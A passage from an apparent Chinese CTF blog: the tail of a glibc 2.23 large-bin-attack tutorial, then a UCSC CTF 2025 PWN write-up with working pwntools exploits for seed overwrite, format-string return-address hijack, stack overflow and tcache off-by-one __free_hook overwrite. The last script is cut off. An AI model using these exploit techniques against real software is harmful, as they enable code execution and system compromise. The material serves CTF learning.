、small bin 然后才到 unsorted bin ，此时会依次取出 unsorted bin 表尾部的chunk(victim)，如果 chunksize(victim) 恰好等于 req_size , 就会直接返回；否则就会根据大小阈值（64-bit系统 &lt;&#x3D; 1024字节进入small bin ，&gt;1024字节进入large bin）插入相对应的 bin 中，再继续尝试下一个 unsorted 条目 。</p><p>如果 unsorted bin 遍历结束还没有找到相应大小的堆块 ，就会依次搜索 small bins 、 large bins ，若仍无合适的堆块，则调用sysmalloc，向系统申请新的堆块空间。</p><hr><p>根据 unsorted bin 相关机制 ，由于我们申请的0x90大小的堆块会优先检查fastbin和small bin，发现两个bins中都没有堆块，于是就进入 unsorted bin 中触发了 unsorted bin 遍历 ，由于unsorted bin 先进先出的规则 ，P1 会先被我们拿出来检查 ，发现大小不等于我们需要申请的0x90的堆块 ，于是根据大小阈值(0x400)，被划入了 large bin 当中，然后接着取出 P2 ，发现同样不满足对应大小 ，于是同样进入了  large bin 当中，unsorted bin 遍历结束 ，发现没有合适的 bin ，就会依次搜索 small bins ，large bins ，同时在搜索large bins的时候，采取 Best-fit 策略，也就是当申请的堆块 &lt;&#x3D;large bin(min_chunk)最小堆块的时候，就会优先从最小堆块进行分配 。</p><p>很显然由于 P1 &#x3D; 0x430 , P2 &#x3D; 0x510 ，所以P1会被拿出来分配堆块，然后分配完堆块的P1就会又被重新放回unsorted bin中。</p><p><img src="/../PWN/LargeBinAttack/5.png" alt="image-20250426203532614"></p><p>现在的局面变成了 P1 进入了unsorted bin, P2 进入了 large bin ，P3为 Allocated chunk 。</p><p><u>第四步：释放P3，三BIN鼎立</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p3);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/6.png" alt="image-20250426204107261"></p><p><u>第五步：构造Large Bin Attack</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/7.png" alt="image-20250426212145734"></p><p><img src="/../PWN/LargeBinAttack/8.png" alt="image-20250426211737512"></p><p>假设有漏洞可以纂改覆写 P2 的 size 、bk 以及 bk_nextsize ，这里是将 P2 的 size 变成了 0x3f1 ，fd 变成了 0 ，bk 变成了 stack_var1 -0x10 , fd_nextsize 变成了 0  ，bk_nextsize 变成了 stack_var2 - 0x20 。</p><p>此时的结构如下图所示：</p><p><img src="/../PWN/LargeBinAttack/9.png" alt="image-20250426211703179"></p><p>由于 bk 和 bk_nextsize 的纂改 ，构造了两个目标地址附近的fake_chunk 。</p><p><img src="/../PWN/LargeBinAttack/10.png" alt="image-20250426213622567"></p><p>但是此时的目标地址的值还没有被修改成堆地址，还需要进行最后一步操作。</p><p><u>第六步：将P3放入 large bin 内，触发 large bin attck 。</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>这一步同上一步一样重要 ，前面提到过 ，Large Bin Attack 无非就是利用大堆块排序机制，这里我们需要把P3放入large bin后，才能触发 Large Bin Attack。</p><p>所以我们需要malloc(0x90)再次触发unsorted bin遍历，首先按照程序肯定是先检查fast bin、small bin，这里面没有，于是就接着检查unsorted bin(此时只有P1和P3在unsorted bin中)，根据先进先出原则，把 P1 给取出来，判断不满足合适大小，直接依照大小阈值，放入small bin中，然后把 P3 拿出来，判断不满足合适大小，放入 large bin 中，遍历结束，没有发现合适堆块，于是依次检查small bin，和 large bin ， 由于 small bin 中只有P1 ，于是 P1 又被拿出来分配堆块，而后重新丢入了 unsorted bin 中(P1好可怜🥹)，而 P3 留在了 large bin 内。</p><p>P3 进入了 large bin 导致触发了 Large Bin Attack ，为什么会触发这个呢？让我们来根据GLIBC-2.23的源码进行分析。</p><p><strong>关于进入large bin的大堆块排序相关源码在下：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>内容稍微有一点多 ，我们把源码拆解分析 ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>首先是这个while循环部分，这里对进入large bin的堆块size进行了一个判断，如果进入large bin的size小于前一个堆块的size，就会执行while循环里面的内容（其实里面就是一个简单的循环排序法，会根据判断，把进入large bin的堆块随着循环不断置前，直到不小于前面一个堆块的size为止——Large Bin由大到小排序），但是由于我们纂改了 P2 的size为 0x3f1 , 并且 P3 &#x3D; 0X510 ，所以P3大于P2 , 不满足while循环的条件,于是我们跳过while循环，来到了下面一个部分。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">    fwd = fwd-&gt;fd; </span><br></pre></td></tr></table></figure><p>这一部分是判断进入Large Bin堆块的size 与前面一个空闲堆块的size是否相等，如果相等的话就会执行if语句里面的内容，但是很显然，进入large bin的 P3 明显不等于 P2，所以跳过了 if 语句里面的内容，进入下一个部分。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> </span><br><span class="line">     &#123;</span><br><span class="line">         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">     &#125;</span><br><span class="line">     bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure><p>这一部分是我们必须要执行的部分了，很明显是对victim(P3)结构的一些赋值操作，这段源码造成了以下影响：</p><p><img src="/../PWN/LargeBinAttack/11.png" alt="image-20250426225014983">（红色部分是前三条源码改变的部分)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br></pre></td></tr></table></figure><p>将 P3 的 fd_nexsize 变成了 P2 的地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure><p>将 P3 的 bk_nextsize 变成了 P2 的 bk_nextsize 也就是 stack_var2 - 0x20</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure><p>将 P2 的 bk_nextsize 变成了 P3 的地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>**关键的一步：**将 P3 的 bk_nextsize 也就是 stack_var2 - 0x20 的 fake_chunk 的 fd_nextsize(stack_var2)变成了 P3 的地址 ！</p><p><img src="/../PWN/LargeBinAttack/12.png" alt="image-20250426225937386"></p><p>细心的你现在可以发现，Large Bin Attack 已经实现了 ，我们把 stack_var2 目标地址写入了我们P3堆块的地址 。</p><p>但是 Large Bin Attack 还没有结束 ，我们接着往下面看。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/13.png" alt="image-20250426231400362"></p><p>上面是在执行代码之前的结构（图一）</p><p><img src="/../PWN/LargeBinAttack/14.png" alt="image-20250426232438420"></p><p>上面是在执行代码之后的结构（图二）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br></pre></td></tr></table></figure><p>首先我们要知道 P3 在进入large bin是插入到 P2 之后的（看图一想象插入 P3 ）</p><p>代码将 P3 的 bk 变成了进入large bin时相同大小的后面一个堆块也就是 stack_var1 - 0x10 （这里虽然之前 P2 纂改了大小，但是它的判定还是在 0x510这个范围，所以可以看作是和 P3 在同一个 Bin 里面）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd = fwd;</span><br></pre></td></tr></table></figure><p>P3 的 fd 变成了 P3 的前面一个堆块也就是 P2 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk = victim;</span><br></pre></td></tr></table></figure><p>将 P2 的 bk 变成了 P3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>将 stack_var1 - 0x10 的 fd 也就是 stack_var1 变成了 P3 !</p><p><img src="/../PWN/LargeBinAttack/15.png" alt="image-20250426233127191"></p><p><strong><u>Large Bin Attack 成功实现！</u></strong></p><p>成功纂改了任意地址的值为堆块的地址。</p><p>后续还会更新关于 Largin Bin Attack 相关题型的讲解，在这篇文章 。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 知识归纳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UCSC CTF 2025 WP</title>
      <link href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/"/>
      <url>/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="UCSC-CTF-2025-WP-—-PWN"><a href="#UCSC-CTF-2025-WP-—-PWN" class="headerlink" title="UCSC CTF 2025 WP —- PWN"></a>UCSC CTF 2025 WP —- PWN</h2><h3 id="BoFido"><a href="#BoFido" class="headerlink" title="BoFido"></a>BoFido</h3><p><img src="/../WP/UCSC2025/1.png" alt="1"></p><p>常规检查： 64位程序 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/2.png" alt="2"></p><p>主函数的代码逻辑非常的简单 循环十次 每次循环创造三个随机数 让玩家进行猜数游戏</p><p>程序中还存在明显的system(“&#x2F;bin&#x2F;sh”)后门函数调用 </p><p>要想进入这个后门函数 我们就必须要满足 v14 &#x3D;&#x3D; 10 这一个条件</p><p>而 v14 这个变量在程序中的作用是统计全猜中的次数 每个回合三个数字全部猜中 v14 的值就会加一 但由于进行猜数的回合只有十次 所以我们若想要进行后门函数调用 最直接的方法就必须要每一个回合都把三个数给猜对 </p><p>但是如果是一直乱猜 明显是不太现实（比彩票中大奖的概率还低）<strong>所以这就需要我们来控制赌局的中奖率</strong> 从而达到把把全猜中的目的</p><p><strong><u>那么我们该如何利用漏洞进行实现呢？</u></strong></p><p><img src="/../WP/UCSC2025/3.png" alt="image-20250422234155656"></p><p>我们想要控制中奖率 就必须要知道 随机数是如何进行生成的：</p><hr><ul><li>C 语言提供了 <code>rand()</code> 函数来生成随机数，该函数通常基于线性同余法等算法实现。每次调用 <code>rand()</code> 函数时，它会根据内部的种子和算法生成下一个随机数。</li></ul><hr><p>但是如果程序每次都利用相同的种子，那么生成的随机数序列也会相同，这样就无法得到真正的随机数，所以通常我们都会以当前时间作为种子，因为时间是无时无刻发生变化的，这样生成的数值才会满足随机性。</p><p><strong>seed &#x3D; time(0LL)</strong></p><p>这行代码的作用是初始化时间的种子 这样我们得到的随机数就是完全随机的了</p><p>这样就不方便我们进行对赌局的把控 </p><p>转念一想，如果生成随机数是根据内部的种子和固定的算法决定的，这个种子因为程序进行了时间初始化，导致种子在不断变化，但如果我们在其生成时间的种子之后，对seed进行一个覆盖，把它覆盖为一个固定大小的值，<strong><u>这样我们生成的随机数序列就会变得有迹可循</u></strong></p><p><u>如果你能够预知未来，这样的赌局还会存在失误吗…..</u></p><h5 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h5><p>由于程序给我们提供了一个0x25字节的输入点 恰好这个输入点存在一个漏洞 让我们进行一个利用</p><p><img src="/../WP/UCSC2025/4.png" alt="image-20250422235747015"></p><p>可以看到输入点 buf 和随机数种子 seed 都存在于栈上，并且相距0x20字节（恰好在0x25输入范围以内）只要我们填充数据0x21个字节把seed覆盖成一个固定的值 这样随机数序列也会固定</p><p><img src="/../WP/UCSC2025/5.png" alt="image-20250423000924364"></p><p>我选择直接填充0x21个的a字节，第一次运行程序记下十个回合的幸运数字，第二次运行程序直接按第一个回合的顺序打就可以直接打通</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="userlogin"><a href="#userlogin" class="headerlink" title="userlogin"></a>userlogin</h3><p><img src="/../WP/UCSC2025/6.png" alt="image-20250423124813045"></p><p>常规检查：64位 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/7.png" alt="image-20250423124845602"></p><p>main（）函数和 generatePassword（）函数没有什么不对劲的地方 我们直接看login（）函数</p><p>login（）函数：</p><p><img src="/../WP/UCSC2025/8.png" alt="image-20250423125310204"></p><p>存在一个输入点，输入大小是32字节，随后strcmp函数对输入的字符串进行对照</p><ol><li><p>supersecureuser</p><p>如果输入的字符串为“supersecureuser”，则进入user（）函数</p></li><li><p>随机字符串</p><p>如果输入的字符串为 a1 ，则进入root（）函数，但是由于 a1 涉及到随机数，所以 a1 具有不确定性，很难对其进行预测</p><h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>user（）函数：</p></li></ol><p><img src="/../WP/UCSC2025/9.png" alt="image-20250423131703908"></p><p>user（）函数内部有一个明显的格式化字符串漏洞 并且由于 main（）函数内for循环的关系，我们可以连续进入三次 login（）函数，从而我们就拥有三次格式化字符串漏洞利用的机会</p><p>同时程序存在shell（）后门函数：</p><p><img src="/../WP/UCSC2025/10.png" alt="image-20250423132447202"></p><h5 id="做题思路：-1"><a href="#做题思路：-1" class="headerlink" title="做题思路："></a>做题思路：</h5><p>1.利用格式化字符串漏洞泄露出返回地址</p><p>2.将返回地址写入栈上 并改返回地址的内容为后门函数的地址</p><p><img src="/../WP/UCSC2025/11.png" alt="image-20250423135436505"></p><p>挑选了一个栈上的一个地址，打算对这个地址进行一个泄露，随后计算出它与返回地址的固定偏移，利用泄露出来的地址加上固定偏移，得到的结果就是返回地址了</p><p><img src="/../WP/UCSC2025/12.png" alt="image-20250423135740277"></p><p>fmtarg 可以计算出泄露地址的偏移是 %7 </p><p>第一段payload就可以构造出来了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;%7$p&#x27;</span><br></pre></td></tr></table></figure><p>这段payload可以直接把内容作为指针泄露出来 计算出固定偏移为 0x38，这样我们就得到了返回地址</p><p>第二次格式化字符串漏洞，我们先把返回地址写入栈上，紧接着对它进行修改，将其指向shell（）后门函数</p><p><img src="/../WP/UCSC2025/13.png" alt="image-20250423185521207"></p><p>可以看到，最初的返回地址指向的是0x4154b这个地址</p><p><img src="/../WP/UCSC2025/14.png" alt="image-20250423185607974"></p><p>我们需要将它改写为0x401265这个地址，也就是需要改写两个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br></pre></td></tr></table></figure><p><img src="/../WP/UCSC2025/15.png" alt="image-20250423190714979"></p><p>可以看到返回地址已经被成功改写</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;retn  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(retn))                  </span><br><span class="line">fmt()</span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>解法二相对于解法一来说 确实较为简单 </p><p><img src="/../WP/UCSC2025/16.png" alt="image-20250423195504888"></p><p>已知user（）函数中存在格式化字符串漏洞，经过测试发现root用户的密码正是上图红框的位置，</p><p>只要通过字格泄露出root的密码，这样我们就可以进入root（）函数</p><p>root（）函数：</p><p><img src="/../WP/UCSC2025/17.png" alt="image-20250423195504889"></p><p>root（）函数具有明显的栈溢出漏洞，由于我们已经知道了shell的地址，所以这题可以通过root（）函数，栈溢出直接劫持返回地址指向shell函数</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$s&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">password = p.recvuntil(<span class="string">&quot;Password:&quot;</span>)[:-<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password  &gt;&gt; &quot;</span> + <span class="built_in">str</span>(password))</span><br><span class="line">p.sendline(password)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Note: \n&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="疯狂复制"><a href="#疯狂复制" class="headerlink" title="疯狂复制"></a>疯狂复制</h3><p><strong>LIBC：2.27-3ubuntu1_amd64</strong></p><p>（本题目解法比较多，后续会看情况更新更多的解法）</p><p><img src="/../WP/UCSC2025/18.png" alt="image-20250424114730714"></p><p>常规检查：64位 RELRO NX PIE</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/19.png" alt="image-20250424115140346"></p><p>  <u>****<strong>很经典的菜单堆题，增删查改四样俱全</strong></u></p><p>del（）函数：</p><p><img src="/../WP/UCSC2025/20.png" alt="image-20250424115351043"></p><p>free后将指针置空，故不存在UAF或者double free漏洞</p><p>edit（）函数：</p><p><img src="/../WP/UCSC2025/21.png" alt="image-20250424115540363"></p><p>setinput（）函数：</p><p><img src="/../WP/UCSC2025/22.png" alt="image-20250424115631440"></p><p>查看edit（）函数 ，初步怀疑存在off by one漏洞</p><p><img src="/../WP/UCSC2025/23.png" alt="image-20250424115906819"></p><p>本地交互证明猜想正确，size大小为8个字节，我们却可以编辑输入9个字节的数据，利用这多出来的一个字节，我们可以做很多事情</p><h4 id="解法一-（off-by-one）："><a href="#解法一-（off-by-one）：" class="headerlink" title="解法一 （off by one）："></a>解法一 （off by one）：</h4><h5 id="做题思路：-2"><a href="#做题思路：-2" class="headerlink" title="做题思路："></a>做题思路：</h5><ol><li>先利用 unsortedbin leak 泄露出 libc基地址</li><li>再通过 off by one 直接修改__free_hook为system的地址</li><li>最后释放一个内容为 &#x2F;bin&#x2F;sh\x00 的堆块 从而getshell</li></ol><p><strong>Part1: 泄露LIBC</strong></p><hr><p>由于题目libc版本是2.27-3ubuntu1_amd64，glibc在2.26版本引入了一个新的堆内存管理机制—-TcacheBin，旨在加速小块内存的分配和释放。</p><h5 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h5><ol><li><p>TcacheBin管理的内存块大小范围为 0x18 - 0x408</p></li><li><p>每个相同大小的TcacheBin最多存储 7 个chunk</p></li><li><p>如果相同大小的TcacheBin没有占满7个chunk，free掉对应大小的堆块后会优先进入TcacheBin 而不是 fastbin 或者是 unsortedbin</p><hr><p>由于TcacheBin的引入，我们无法直接使用unsortedbin leak，因为释放的堆块会优先进入tcachebin，但是由于tcachebin存储的chunk数量有限制，只要我们把7个位置全部占满，这样我们就可以释放对应大小的堆块，从而进入unsortedbin。</p><p><img src="/../WP/UCSC2025/24.png" alt="image-20250424132206434"></p><p>先创造9个0x90的堆块，我们需要先释放前七个堆块，占满tcachebin，然后释放第8个堆块，使其进入unsortedbin，第九个堆块的作用是隔绝topchunk，防止free掉的unsortedbin与topchunk进行合并。</p><p><img src="/../WP/UCSC2025/25.png" alt="image-20250424132650387"></p></li></ol><p>可以看到chunk8已经进入了unsortedbin当中，紧接着我们需要增添一个chunk_size为0x40大小的堆块10（其实chunk_size在0x90以内都可以），这个堆块是由unsortedbin分配的，之所以要增添一个0x40大小的chunk10，而不是增添一个0x90大小的chunk10，是因为TcacheBin如果大小匹配，会优先从TcacheBin中分配堆块，这样一来我们就无法利用unsortedbin leak了（不了解unsortedbin leak的，可以先去查阅相关资料）</p><p><img src="/../WP/UCSC2025/26.png" alt="image-20250424134108511"></p><p>利用show（）函数，我们就可以得到chunk10中的内容，计算与libc基地址的偏移，然后用泄露出来的指针减去偏移，我们就得到了libc基地址</p><p>不过在进行下一步之前，记得先把unsortedbin中剩下的0x50大小的chunk申请回来，以免造成干扰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -  <span class="number">0x3ebd20</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p><strong>Part2 : off by one 修改__free_hook</strong> </p><p>虽然tcachebin不是之前熟悉的 fastbin，但是我们同样可以利用 off by one 漏洞 —— 新的堆内存管理机制虽然提高了性能，但也减低了安全性，tcache的检查机制相对与fastbin甚至还有所减少</p><p><img src="/../WP/UCSC2025/27.png" alt="image-20250424134539382"></p><p>先创造三个0x40大小的chunk，分别是 chunk11、chunk12 以及 chunk13</p><p><img src="/../WP/UCSC2025/29.png" alt="image-20250424134700582"></p><p>查看chunk11的内存分布，我们的目的是利用多溢出的一个字节修改chunk12堆块的大小为0x71，然后free掉chunk12，造成chunk12与chunk13的堆块重叠，这样我们就可以修改利用chunk12来修改chunk13的内容，其作用等同于UAF漏洞</p><p><img src="/../WP/UCSC2025/28.png" alt="image-20250424140455138"></p><p>可以看到原本chunk13的位置，chunk13的fd指针已经被我们改写成了free_hook的地址，指向了free_hook,所以只要在申请两个堆块，分别是chunk14和chunk15，我们就可以把free_hook申请出来（chunk15对应的是free_hook),我们把chunk14的内容修改成&#x2F;bin&#x2F;sh\x00，把chunk15的内容修改成system_addr,这样我们只要执行free(14),就相当于执行了system(‘&#x2F;bin&#x2F;sh\x00’)</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">def add(index,size):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Size &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">#--------------------------------------------------------------------------#</span><br><span class="line">#part1</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x80)</span><br><span class="line">for i in range(8):</span><br><span class="line">    free(i)</span><br><span class="line">free(7)</span><br><span class="line">add(9,0x30)</span><br><span class="line">show(9)</span><br><span class="line">p.recvuntil(&quot;Content: &quot;)</span><br><span 